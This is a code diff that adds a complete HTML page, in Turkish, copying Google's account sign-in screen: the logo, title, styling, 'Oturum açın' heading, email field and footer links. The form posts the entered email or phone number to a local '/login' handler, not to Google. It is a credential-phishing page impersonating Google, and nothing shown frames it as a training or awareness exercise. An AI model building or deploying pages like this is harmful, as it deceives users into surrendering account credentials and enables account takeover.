@@ -1,1 +1,268 @@
-
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Hesabı'nda oturum açın - Google Hesapları</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Google Sans', 'Noto Sans', Roboto, Arial, sans-serif;
+        }
+        
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background-color: #fff;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            margin-bottom: 16px;
+        }
+        
+        .heading {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .subheading {
+            color: #202124;
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .login-form {
+            width: 100%;
+        }
+        
+        .form-group {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        
+        .input-field {
+            width: 100%;
+            height: 56px;
+            padding: 12px 14px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .input-field:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+        
+        .input-field:focus + .input-label {
+            top: -8px;
+            left: 12px;
+            font-size: 12px;
+            padding: 0 4px;
+            background-color: #fff;
+            color: #1a73e8;
+        }
+        
+        .input-label {
+            position: absolute;
+            left: 14px;
+            top: 18px;
+            color: #5f6368;
+            font-size: 16px;
+            background-color: transparent;
+            transition: all 0.2s;
+            pointer-events: none;
+        }
+        
+        .input-field:not(:placeholder-shown) + .input-label {
+            top: -8px;
+            left: 12px;
+            font-size: 12px;
+            padding: 0 4px;
+            background-color: #fff;
+        }
+        
+        .forgot-email {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 40px;
+            display: inline-block;
+        }
+        
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        
+        .info-text {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 32px;
+            text-align: left;
+            width: 100%;
+        }
+        
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+        
+        .bottom-buttons {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            margin-top: 20px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            padding: 10px;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+            background-color: #f6fafe;
+            border-radius: 4px;
+        }
+        
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        
+        .next-button:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
+        }
+        
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 450px;
+            padding: 20px 0;
+            margin-top: 20px;
+        }
+        
+        .language-select {
+            color: #5f6368;
+            font-size: 12px;
+            border: none;
+            background: transparent;
+            outline: none;
+        }
+        
+        .footer-links {
+            display: flex;
+        }
+        
+        .footer-link {
+            color: #5f6368;
+            font-size: 12px;
+            text-decoration: none;
+            margin-left: 24px;
+        }
+        
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 450px) {
+            .login-container {
+                border: none;
+                padding: 24px;
+                max-width: 100%;
+            }
+            
+            .footer {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .footer-links {
+                margin-top: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+        <h1 class="heading">Oturum açın</h1>
+        <h2 class="subheading">Google Hesabınızı kullanın</h2>
+        
+        <form action="/login" method="POST" class="login-form">
+            <div class="form-group">
+                <input type="text" id="email" name="email" class="input-field" placeholder=" " required>
+                <label for="email" class="input-label">E-posta veya telefon</label>
+            </div>
+            
+            <a href="#" class="forgot-email">E-postanızı mı unuttunuz?</a>
+            
+            <p class="info-text">
+                Bu bilgisayarı kullanıp kullanmadığınızı bilmiyorsanız gizli oturum açın. <a href="#">Daha fazla bilgi</a>
+            </p>
+            
+            <div class="bottom-buttons">
+                <a href="#" class="create-account">Hesap oluşturun</a>
+                <button type="submit" class="next-button">İleri</button>
+            </div>
+        </form>
+    </div>
+    
+    <div class="footer">
+        <select class="language-select">
+            <option>Türkçe</option>
+            <option>English (United States)</option>
+            <option>Azərbaycanca</option>
+            <option>Català</option>
+            <option>Dansk</option>
+            <option>Deutsch</option>
+        </select>
+        
+        <div class="footer-links">
+            <a href="#" class="footer-link">Yardım</a>
+            <a href="#" class="footer-link">Gizlilik</a>
+            <a href="#" class="footer-link">Şartlar</a>
+        </div>
+    </div>
+</body>
+</html>
